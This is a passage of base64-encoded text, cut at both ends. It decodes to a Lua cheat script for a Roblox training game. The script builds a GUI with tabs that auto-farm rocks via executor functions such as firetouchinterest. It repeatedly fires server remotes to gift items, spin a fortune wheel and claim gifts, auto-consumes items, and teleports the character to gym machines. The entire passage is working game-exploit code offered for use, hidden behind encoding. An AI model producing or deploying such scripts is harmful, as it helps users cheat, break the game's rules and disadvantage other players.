1RhYiA9IFdpbmRvdzpUYWIoe1RpdGxlID0gIlJvY2siLCBJY29uID0gIm1vdW50YWluIn0pDQoNCi0tIEZhc3QgR2xpdGNoIFNlY3Rpb24NClJvY2tUYWI6U2VjdGlvbih7VGl0bGUgPSAiRkFTVCBHTElUQ0gifSkNCg0KbG9jYWwgc2VsZWN0cm9jayA9ICIiDQoNCi0tIFJvY2sgRmFybSBGdW5jdGlvbnMNCmxvY2FsIGZ1bmN0aW9uIGNyZWF0ZVJvY2tUb2dnbGUodGl0bGUsIGRlc2MsIHJvY2tOYW1lLCBkdXJhYmlsaXR5KQ0KICAgIFJvY2tUYWI6VG9nZ2xlKHsNCiAgICAgICAgVGl0bGUgPSB0aXRsZSwNCiAgICAgICAgRGVzYyA9IGRlc2MsDQogICAgICAgIFZhbHVlID0gZmFsc2UsDQogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpDQogICAgICAgICAgICBzZWxlY3Ryb2NrID0gcm9ja05hbWUNCiAgICAgICAgICAgIGdldGdlbnYoKS5hdXRvRmFybSA9IHN0YXRlDQogICAgICAgICAgICB3aGlsZSBnZXRnZW52KCkuYXV0b0Zhcm0gZG8NCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQ0KICAgICAgICAgICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkR1cmFiaWxpdHkuVmFsdWUgPj0gZHVyYWJpbGl0eSB0aGVuDQogICAgICAgICAgICAgICAgICAgIGZvciBpLCB2IGluIHBhaXJzKGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIikubWFjaGluZXNGb2xkZXI6R2V0RGVzY2VuZGFudHMoKSkgZG8NCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHYuTmFtZSA9PSAibmVlZGVkRHVyYWJpbGl0eSIgYW5kIHYuVmFsdWUgPT0gZHVyYWJpbGl0eSBhbmQgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiTGVmdEhhbmQiKSBhbmQgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUmlnaHRIYW5kIikgdGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5SaWdodEhhbmQsIDApDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLlJpZ2h0SGFuZCwgMSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuTGVmdEhhbmQsIDApDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkxlZnRIYW5kLCAxKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBpLCB2IGluIHBhaXJzKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB2Lk5hbWUgPT0gIlB1bmNoIiBhbmQgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSB0aGVuDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkOkVxdWlwVG9vbCh2KQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJwdW5jaCIsICJsZWZ0SGFuZCIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicHVuY2giLCAicmlnaHRIYW5kIikNCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgIGVuZA0KICAgICAgICBlbmQNCiAgICB9KQ0KZW5kDQoNCi0tIFJvY2sgRmFybSBUb2dnbGVzDQpjcmVhdGVSb2NrVG9nZ2xlKCJBdXRvIFRpbnlJc2xhbmRSb2NrIFswXSIsICIwIER1cmFiaWxpdHkgUmVxdWlyZWQiLCAiVGlueSBJc2xhbmQgUm9jayIsIDApDQpjcmVhdGVSb2NrVG9nZ2xlKCJBdXRvIFN0YXJ0ZXJJc2xhbmRSb2NrIFsxMDBdIiwgIjEwMCBEdXJhYmlsaXR5IFJlcXVpcmVkIiwgIlN0YXJ0ZXIgSXNsYW5kIFJvY2siLCAxMDApDQpjcmVhdGVSb2NrVG9nZ2xlKCJBdXRvIExlZ2VuZEJlYWNoUm9jayBbNWtdIiwgIjUsMDAwIER1cmFiaWxpdHkgUmVxdWlyZWQiLCAiTGVnZW5kIEJlYWNoIFJvY2siLCA1MDAwKQ0KY3JlYXRlUm9ja1RvZ2dsZSgiQXV0byBGcm9zdEd5bVJvY2sgWzE1MGtdIiwgIjE1MCwwMDAgRHVyYWJpbGl0eSBSZXF1aXJlZCIsICJGcm9zdCBHeW0gUm9jayIsIDE1MDAwMCkNCmNyZWF0ZVJvY2tUb2dnbGUoIkF1dG8gTXl0aGljYWxHeW1Sb2NrIFs0MDBrXSIsICI0MDAsMDAwIER1cmFiaWxpdHkgUmVxdWlyZWQiLCAiTXl0aGljYWwgR3ltIFJvY2siLCA0MDAwMDApDQpjcmVhdGVSb2NrVG9nZ2xlKCJBdXRvIEV0ZXJuYWxHeW1Sb2NrIFs3NTBrXSIsICI3NTAsMDAwIER1cmFiaWxpdHkgUmVxdWlyZWQiLCAiRXRlcm5hbCBHeW0gUm9jayIsIDc1MDAwMCkNCmNyZWF0ZVJvY2tUb2dnbGUoIkF1dG8gTGVnZW5kR3ltUm9jayBbMW1dIiwgIjEsMDAwLDAwMCBEdXJhYmlsaXR5IFJlcXVpcmVkIiwgIkxlZ2VuZCBHeW0gUm9jayIsIDEwMDAwMDApDQpjcmVhdGVSb2NrVG9nZ2xlKCJBdXRvIE11c2NsZUtpbmdHeW1Sb2NrIFs1bV0iLCAiNSwwMDAsMDAwIER1cmFiaWxpdHkgUmVxdWlyZWQiLCAiTXVzY2xlIEtpbmcgR3ltIFJvY2siLCA1MDAwMDAwKQ0KY3JlYXRlUm9ja1RvZ2dsZSgiQXV0byBBbmNpZW50SnVuZ2xlUm9jayBbMTBtXSIsICIxMCwwMDAsMDAwIER1cmFiaWxpdHkgUmVxdWlyZWQiLCAiQW5jaWVudCBKdW5nbGUgUm9jayIsIDEwMDAwMDAwKQ0KDQotLSBFZ2dzIFRhYg0KbG9jYWwgRWdnc1RhYiA9IFdpbmRvdzpUYWIoe1RpdGxlID0gIkVnZ3MiLCBJY29uID0gImdpZnQifSkNCg0KLS0gUHJvdGVpbiBFZ2cgR2lmdGluZyBTZWN0aW9uDQpFZ2dzVGFiOlNlY3Rpb24oe1RpdGxlID0gIkdpZnRpbmcgUHJvdGVpbiBFZ2cifSkNCg0KbG9jYWwgcHJvdGVpbkVnZ0xhYmVsID0gRWdnc1RhYjpMYWJlbCh7VGl0bGUgPSAiUHJvdGVpbiBFZ2dzIiwgRGVzYyA9ICIwIn0pDQpsb2NhbCBzZWxlY3RlZEVnZ1BsYXllciA9IG5pbA0KbG9jYWwgZWdnQ291bnQgPSAwDQoNCmxvY2FsIGVnZ0Ryb3Bkb3duID0gRWdnc1RhYjpEcm9wZG93bih7DQogICAgVGl0bGUgPSAiUGxheWVyIHRvIEdpZnQgRWdncyIsDQogICAgTGlzdCA9IHt9LA0KICAgIFZhbHVlID0gIiIsDQogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzZWxlY3RlZERpc3BsYXlOYW1lKQ0KICAgICAgICBmb3IgXywgcGxyIGluIGlwYWlycyhnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKTpHZXRQbGF5ZXJzKCkpIGRvDQogICAgICAgICAgICBpZiBwbHIuRGlzcGxheU5hbWUgPT0gc2VsZWN0ZWREaXNwbGF5TmFtZSB0aGVuDQogICAgICAgICAgICAgICAgc2VsZWN0ZWRFZ2dQbGF5ZXIgPSBwbHINCiAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgZW5kDQogICAgICAgIGVuZA0KICAgIGVuZA0KfSkNCg0KLS0gUG9wdWxhdGUgZHJvcGRvd24gd2l0aCBwbGF5ZXJzDQpmb3IgXywgcGxyIGluIGlwYWlycyhnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKTpHZXRQbGF5ZXJzKCkpIGRvDQogICAgaWYgcGxyIH49IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyIHRoZW4NCiAgICAgICAgZWdnRHJvcGRvd246QWRkKHBsci5EaXNwbGF5TmFtZSkNCiAgICBlbmQNCmVuZA0KDQpnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5QbGF5ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKHBscikNCiAgICBpZiBwbHIgfj0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIgdGhlbg0KICAgICAgICBlZ2dEcm9wZG93bjpBZGQocGxyLkRpc3BsYXlOYW1lKQ0KICAgIGVuZA0KZW5kKQ0KDQpFZ2dzVGFiOlRleHRib3goew0KICAgIFRpdGxlID0gIkFtb3VudCBvZiBFZ2dzIiwNCiAgICBEZXNjID0gIkVudGVyIG51bWJlciBvZiBlZ2dzIHRvIGdpZnQiLA0KICAgIFBsYWNlaG9sZGVyID0gIjAiLA0KICAgIFZhbHVlID0gIiIsDQogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0ZXh0KQ0KICAgICAgICBlZ2dDb3VudCA9IHRvbnVtYmVyKHRleHQpIG9yIDANCiAgICBlbmQNCn0pDQoNCkVnZ3NUYWI6QnV0dG9uKHsNCiAgICBUaXRsZSA9ICJHaWZ0IEVnZ3MiLA0KICAgIERlc2MgPSAiU2VuZCBwcm90ZWluIGVnZ3MgdG8gc2VsZWN0ZWQgcGxheWVyIiwNCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkNCiAgICAgICAgaWYgc2VsZWN0ZWRFZ2dQbGF5ZXIgYW5kIGVnZ0NvdW50ID4gMCB0aGVuDQogICAgICAgICAgICBmb3IgaSA9IDEsIGVnZ0NvdW50IGRvDQogICAgICAgICAgICAgICAgbG9jYWwgZWdnID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuY29uc3VtYWJsZXNGb2xkZXI6RmluZEZpcnN0Q2hpbGQoIlByb3RlaW4gRWdnIikNCiAgICAgICAgICAgICAgICBpZiBlZ2cgdGhlbg0KICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuckV2ZW50cy5naWZ0UmVtb3RlOkludm9rZVNlcnZlcigiZ2lmdFJlcXVlc3QiLCBzZWxlY3RlZEVnZ1BsYXllciwgZWdnKQ0KICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4xKQ0KICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgZW5kDQogICAgICAgIGVuZA0KICAgIGVuZA0KfSkNCg0KLS0gVHJvcGljYWwgU2hha2UgR2lmdGluZyBTZWN0aW9uDQpFZ2dzVGFiOlNlY3Rpb24oe1RpdGxlID0gIkdpZnRpbmcgVHJvcGljYWwgU2hha2VzIn0pDQoNCmxvY2FsIHRyb3BpY2FsU2hha2VMYWJlbCA9IEVnZ3NUYWI6TGFiZWwoe1RpdGxlID0gIlRyb3BpY2FsIFNoYWtlcyIsIERlc2MgPSAiMCJ9KQ0KbG9jYWwgc2VsZWN0ZWRTaGFrZVBsYXllciA9IG5pbA0KbG9jYWwgc2hha2VDb3VudCA9IDANCg0KbG9jYWwgc2hha2VEcm9wZG93biA9IEVnZ3NUYWI6RHJvcGRvd24oew0KICAgIFRpdGxlID0gIlBsYXllciB0byBHaWZ0IFRyb3BpY2FsIFNoYWtlcyIsDQogICAgTGlzdCA9IHt9LA0KICAgIFZhbHVlID0gIiIsDQogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzZWxlY3RlZERpc3BsYXlOYW1lKQ0KICAgICAgICBmb3IgXywgcGxyIGluIGlwYWlycyhnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKTpHZXRQbGF5ZXJzKCkpIGRvDQogICAgICAgICAgICBpZiBwbHIuRGlzcGxheU5hbWUgPT0gc2VsZWN0ZWREaXNwbGF5TmFtZSB0aGVuDQogICAgICAgICAgICAgICAgc2VsZWN0ZWRTaGFrZVBsYXllciA9IHBscg0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICBlbmQNCiAgICAgICAgZW5kDQogICAgZW5kDQp9KQ0KDQpmb3IgXywgcGxyIGluIGlwYWlycyhnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKTpHZXRQbGF5ZXJzKCkpIGRvDQogICAgaWYgcGxyIH49IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyIHRoZW4NCiAgICAgICAgc2hha2VEcm9wZG93bjpBZGQocGxyLkRpc3BsYXlOYW1lKQ0KICAgIGVuZA0KZW5kDQoNCmdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLlBsYXllckFkZGVkOkNvbm5lY3QoZnVuY3Rpb24ocGxyKQ0KICAgIGlmIHBsciB+PSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllciB0aGVuDQogICAgICAgIHNoYWtlRHJvcGRvd246QWRkKHBsci5EaXNwbGF5TmFtZSkNCiAgICBlbmQNCmVuZCkNCg0KRWdnc1RhYjpUZXh0Ym94KHsNCiAgICBUaXRsZSA9ICJUcm9waWNhbCBTaGFrZXMgZ2lmdCIsDQogICAgRGVzYyA9ICJFbnRlciBudW1iZXIgb2Ygc2hha2VzIHRvIGdpZnQiLA0KICAgIFBsYWNlaG9sZGVyID0gIjAiLA0KICAgIFZhbHVlID0gIiIsDQogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0ZXh0KQ0KICAgICAgICBzaGFrZUNvdW50ID0gdG9udW1iZXIodGV4dCkgb3IgMA0KICAgIGVuZA0KfSkNCg0KRWdnc1RhYjpCdXR0b24oew0KICAgIFRpdGxlID0gIkdpZnQgVHJvcGljYWwgU2hha2VzIiwNCiAgICBEZXNjID0gIlNlbmQgdHJvcGljYWwgc2hha2VzIHRvIHNlbGVjdGVkIHBsYXllciIsDQogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpDQogICAgICAgIGlmIHNlbGVjdGVkU2hha2VQbGF5ZXIgYW5kIHNoYWtlQ291bnQgPiAwIHRoZW4NCiAgICAgICAgICAgIGZvciBpID0gMSwgc2hha2VDb3VudCBkbw0KICAgICAgICAgICAgICAgIGxvY2FsIHNoYWtlID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuY29uc3VtYWJsZXNGb2xkZXI6RmluZEZpcnN0Q2hpbGQoIlRyb3BpY2FsIFNoYWtlIikNCiAgICAgICAgICAgICAgICBpZiBzaGFrZSB0aGVuDQogICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5yRXZlbnRzLmdpZnRSZW1vdGU6SW52b2tlU2VydmVyKCJnaWZ0UmVxdWVzdCIsIHNlbGVjdGVkU2hha2VQbGF5ZXIsIHNoYWtlKQ0KICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4xKQ0KICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgZW5kDQogICAgICAgIGVuZA0KICAgIGVuZA0KfSkNCg0KLS0gSXRlbSBDb3VudCBVcGRhdGVyDQpsb2NhbCBmdW5jdGlvbiB1cGRhdGVJdGVtQ291bnQoKQ0KICAgIGxvY2FsIHByb3RlaW5FZ2dDb3VudCA9IDANCiAgICBsb2NhbCB0cm9waWNhbFNoYWtlQ291bnQgPSAwDQoNCiAgICBsb2NhbCBiYWNrcGFjayA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyOldhaXRGb3JDaGlsZCgiQmFja3BhY2siKQ0KICAgIGlmIGJhY2twYWNrIHRoZW4NCiAgICAgICAgZm9yIF8sIGl0ZW0gaW4gaXBhaXJzKGJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvDQogICAgICAgICAgICBpZiBpdGVtLk5hbWUgPT0gIlByb3RlaW4gRWdnIiB0aGVuDQogICAgICAgICAgICAgICAgcHJvdGVpbkVnZ0NvdW50ID0gcHJvdGVpbkVnZ0NvdW50ICsgMQ0KICAgICAgICAgICAgZWxzZWlmIGl0ZW0uTmFtZSA9PSAiVHJvcGljYWwgU2hha2UiIG9yIGl0ZW0uTmFtZSA9PSAiUGnDg8aSw4bigJnDg+KAoMOi4oKs4oSiw4PGksOi4oKsxaHDg+KAmsOCwrFhcyIgdGhlbg0KICAgICAgICAgICAgICAgIHRyb3BpY2FsU2hha2VDb3VudCA9IHRyb3BpY2FsU2hha2VDb3VudCArIDENCiAgICAgICAgICAgIGVuZA0KICAgICAgICBlbmQNCiAgICBlbmQNCg0KICAgIHByb3RlaW5FZ2dMYWJlbDpTZXREZXNjKHRvc3RyaW5nKHByb3RlaW5FZ2dDb3VudCkpDQogICAgdHJvcGljYWxTaGFrZUxhYmVsOlNldERlc2ModG9zdHJpbmcodHJvcGljYWxTaGFrZUNvdW50KSkNCmVuZA0KDQp0YXNrLnNwYXduKGZ1bmN0aW9uKCkNCiAgICB3aGlsZSB0cnVlIGRvDQogICAgICAgIHVwZGF0ZUl0ZW1Db3VudCgpDQogICAgICAgIHRhc2sud2FpdCgwLjI1KQ0KICAgIGVuZA0KZW5kKQ0KDQotLSBBdXRvIEZlYXR1cmVzIFNlY3Rpb24NCkVnZ3NUYWI6U2VjdGlvbih7VGl0bGUgPSAiQXV0byBGZWF0dXJlcyJ9KQ0KDQotLSBBdXRvIEVhdCBFZ2cgKDMwbWluKQ0KbG9jYWwgYXV0b0VnZ0VuYWJsZWQzMCA9IGZhbHNlDQpsb2NhbCBmdW5jdGlvbiBhdXRvRWF0RWdnMzAoKQ0KICAgIGxvY2FsIHBsYXllciA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyDQogICAgd2hpbGUgYXV0b0VnZ0VuYWJsZWQzMCBkbw0KICAgICAgICBsb2NhbCB0b29sID0gcGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJQcm90ZWluIEVnZyIpDQogICAgICAgIGlmIHRvb2wgdGhlbg0KICAgICAgICAgICAgdG9vbC5QYXJlbnQgPSBwbGF5ZXIuQ2hhcmFjdGVyDQogICAgICAgICAgICB0YXNrLndhaXQoMC4xKQ0KICAgICAgICAgICAgdG9vbDpBY3RpdmF0ZSgpDQogICAgICAgICAgICB0YXNrLndhaXQoMTgwMCkgLS0gMzAgbWludXRlcw0KICAgICAgICBlbHNlDQogICAgICAgICAgICB0YXNrLndhaXQoMSkNCiAgICAgICAgZW5kDQogICAgZW5kDQplbmQNCg0KRWdnc1RhYjpUb2dnbGUoew0KICAgIFRpdGxlID0gIkF1dG8gUHJvdGVpbiBFZ2cgKDMwbWluKSIsDQogICAgRGVzYyA9ICJBdXRvbWF0aWNhbGx5IGVhdCBwcm90ZWluIGVnZ3MgZXZlcnkgMzAgbWludXRlcyIsDQogICAgVmFsdWUgPSBmYWxzZSwNCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQ0KICAgICAgICBhdXRvRWdnRW5hYmxlZDMwID0gc3RhdGUNCiAgICAgICAgaWYgc3RhdGUgdGhlbiB0YXNrLnNwYXduKGF1dG9FYXRFZ2czMCkgZW5kDQogICAgZW5kDQp9KQ0KDQotLSBBdXRvIEVhdCBFZ2cgKDFob3VyKQ0KbG9jYWwgYXV0b0VnZ0VuYWJsZWQ2MCA9IGZhbHNlDQpsb2NhbCBmdW5jdGlvbiBhdXRvRWF0RWdnNjAoKQ0KICAgIGxvY2FsIHBsYXllciA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyDQogICAgd2hpbGUgYXV0b0VnZ0VuYWJsZWQ2MCBkbw0KICAgICAgICBsb2NhbCB0b29sID0gcGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJQcm90ZWluIEVnZyIpDQogICAgICAgIGlmIHRvb2wgdGhlbg0KICAgICAgICAgICAgdG9vbC5QYXJlbnQgPSBwbGF5ZXIuQ2hhcmFjdGVyDQogICAgICAgICAgICB0YXNrLndhaXQoMC4xKQ0KICAgICAgICAgICAgdG9vbDpBY3RpdmF0ZSgpDQogICAgICAgICAgICB0YXNrLndhaXQoMzYwMCkgLS0gMSBob3VyDQogICAgICAgIGVsc2UNCiAgICAgICAgICAgIHRhc2sud2FpdCgxKQ0KICAgICAgICBlbmQNCiAgICBlbmQNCmVuZA0KDQpFZ2dzVGFiOlRvZ2dsZSh7DQogICAgVGl0bGUgPSAiQXV0byBQcm90ZWluIEVnZyAoMWhvdXIpIiwNCiAgICBEZXNjID0gIkF1dG9tYXRpY2FsbHkgZWF0IHByb3RlaW4gZWdncyBldmVyeSBob3VyIiwNCiAgICBWYWx1ZSA9IGZhbHNlLA0KICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpDQogICAgICAgIGF1dG9FZ2dFbmFibGVkNjAgPSBzdGF0ZQ0KICAgICAgICBpZiBzdGF0ZSB0aGVuIHRhc2suc3Bhd24oYXV0b0VhdEVnZzYwKSBlbmQNCiAgICBlbmQNCn0pDQoNCi0tIEF1dG8gRWF0IEFsbCBTbmFja3MNCmxvY2FsIGVhdFNuYWNrRW5hYmxlZCA9IGZhbHNlDQpsb2NhbCBzbmFja3MgPSB7IlRyb3BpY2FsIFNoYWtlIn0gLS0gQWRkIG90aGVyIHNuYWNrIG5hbWVzIGFzIG5lZWRlZA0KDQpsb2NhbCBmdW5jdGlvbiBlYXRBbGxTbmFjaygpDQogICAgbG9jYWwgcGxheWVyID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXINCiAgICB3aGlsZSBlYXRTbmFja0VuYWJsZWQgZG8NCiAgICAgICAgZm9yIF8sIHNuYWNrTmFtZSBpbiBpcGFpcnMoc25hY2tzKSBkbw0KICAgICAgICAgICAgbG9jYWwgdG9vbCA9IHBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZChzbmFja05hbWUpDQogICAgICAgICAgICBpZiB0b29sIHRoZW4NCiAgICAgICAgICAgICAgICB0b29sLlBhcmVudCA9IHBsYXllci5DaGFyYWN0ZXINCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4xKQ0KICAgICAgICAgICAgICAgIHRvb2w6QWN0aXZhdGUoKQ0KICAgICAgICAgICAgZW5kDQogICAgICAgIGVuZA0KICAgICAgICB0YXNrLndhaXQobWF0aC5yYW5kb20oMSwgMikpDQogICAgZW5kDQplbmQNCg0KRWdnc1RhYjpUb2dnbGUoew0KICAgIFRpdGxlID0gIkF1dG8gRWF0IEFsbCBTbmFja3MiLA0KICAgIERlc2MgPSAiQXV0b21hdGljYWxseSBjb25zdW1lIGFsbCBhdmFpbGFibGUgc25hY2tzIiwNCiAgICBWYWx1ZSA9IGZhbHNlLA0KICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpDQogICAgICAgIGVhdFNuYWNrRW5hYmxlZCA9IHN0YXRlDQogICAgICAgIGlmIHN0YXRlIHRoZW4gdGFzay5zcGF3bihlYXRBbGxTbmFjaykgZW5kDQogICAgZW5kDQp9KQ0KDQotLSBBdXRvIFNwaW4gV2hlZWwNCmxvY2FsIGF1dG9TcGluV2hlZWxFbmFibGVkID0gZmFsc2UNCg0KbG9jYWwgZnVuY3Rpb24gYXV0b1NwaW5XaGVlbCgpDQogICAgd2hpbGUgYXV0b1NwaW5XaGVlbEVuYWJsZWQgZG8NCiAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLnJFdmVudHMub3BlbkZvcnR1bmVXaGVlbFJlbW90ZTpJbnZva2VTZXJ2ZXIoIm9wZW5Gb3J0dW5lV2hlZWwiLCBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuZm9ydHVuZVdoZWVsQ2hhbmNlc1siRm9ydHVuZSBXaGVlbCJdKQ0KICAgICAgICB0YXNrLndhaXQoMSkNCiAgICBlbmQNCmVuZA0KDQpFZ2dzVGFiOlRvZ2dsZSh7DQogICAgVGl0bGUgPSAiQXV0byBTcGluIEZvcnR1bmUgV2hlZWwiLA0KICAgIERlc2MgPSAiQXV0b21hdGljYWxseSBzcGluIHRoZSBmb3J0dW5lIHdoZWVsIiwNCiAgICBWYWx1ZSA9IGZhbHNlLA0KICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpDQogICAgICAgIGF1dG9TcGluV2hlZWxFbmFibGVkID0gc3RhdGUNCiAgICAgICAgaWYgc3RhdGUgdGhlbiB0YXNrLnNwYXduKGF1dG9TcGluV2hlZWwpIGVuZA0KICAgIGVuZA0KfSkNCg0KLS0gQXV0byBDbGFpbSBHaWZ0DQpsb2NhbCBhdXRvQ2xhaW1HaWZ0ID0gZmFsc2UNCg0KRWdnc1RhYjpUb2dnbGUoew0KICAgIFRpdGxlID0gIkF1dG8gQ2xhaW0gR2lmdCIsDQogICAgRGVzYyA9ICJBdXRvbWF0aWNhbGx5IGNsYWltIGZyZWUgZ2lmdHMiLA0KICAgIFZhbHVlID0gZmFsc2UsDQogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkNCiAgICAgICAgYXV0b0NsYWltR2lmdCA9IHN0YXRlDQogICAgICAgIHdoaWxlIGF1dG9DbGFpbUdpZnQgZG8NCiAgICAgICAgICAgIGZvciBpID0gMSwgOCBkbw0KICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5yRXZlbnRzLmZyZWVHaWZ0Q2xhaW1SZW1vdGU6SW52b2tlU2VydmVyKCJjbGFpbUdpZnQiLCBpKQ0KICAgICAgICAgICAgZW5kDQogICAgICAgICAgICB0YXNrLndhaXQoMSkNCiAgICAgICAgZW5kDQogICAgZW5kDQp9KQ0KDQotLSBHeW0gVGFiDQpsb2NhbCBHeW1UYWIgPSBXaW5kb3c6VGFiKHtUaXRsZSA9ICJHeW0iLCBJY29uID0gImR1bWJiZWxsIn0pDQoNCkd5bVRhYjpTZWN0aW9uKHtUaXRsZSA9ICJHWU0gTUFDSElORVMifSkNCg0KbG9jYWwgY3VycmVudE1hY2hpbmUgPSBuaWwNCmxvY2FsIGN1cnJlbnRNYWNoaW5lQWN0aXZlID0gZmFsc2UNCg0KLS0gRnVuY3Rpb24gdG8gdXNlIG1hY2hpbmUgKHRlbGVwb3J0IG9uY2UpDQpsb2NhbCBmdW5jdGlvbiBzZXR1cE1hY2hpbmUobWFjaGluZU5hbWUpDQogICAgcGNhbGwoZnVuY3Rpb24oKQ0KICAgICAgICBsb2NhbCBtYWNoaW5lID0gd29ya3NwYWNlLm1hY2hpbmVzRm9sZGVyOkZpbmRGaXJzdENoaWxkKG1hY2hpbmVOYW1lKQ0KICAgICAgICBpZiBtYWNoaW5lIGFuZCBtYWNoaW5lOkZpbmRGaXJzdENoaWxkKCJpbnRlcmFjdFNlYXQiKSB0aGVuDQogICAgICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyDQogICAgICAgICAgICBpZiBjaGFyYWN0ZXIgYW5kIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4NCiAgICAgICAgICAgICAgICBjaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBtYWNoaW5lLmludGVyYWN0U2VhdC5DRnJhbWUNCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4yKQ0KIC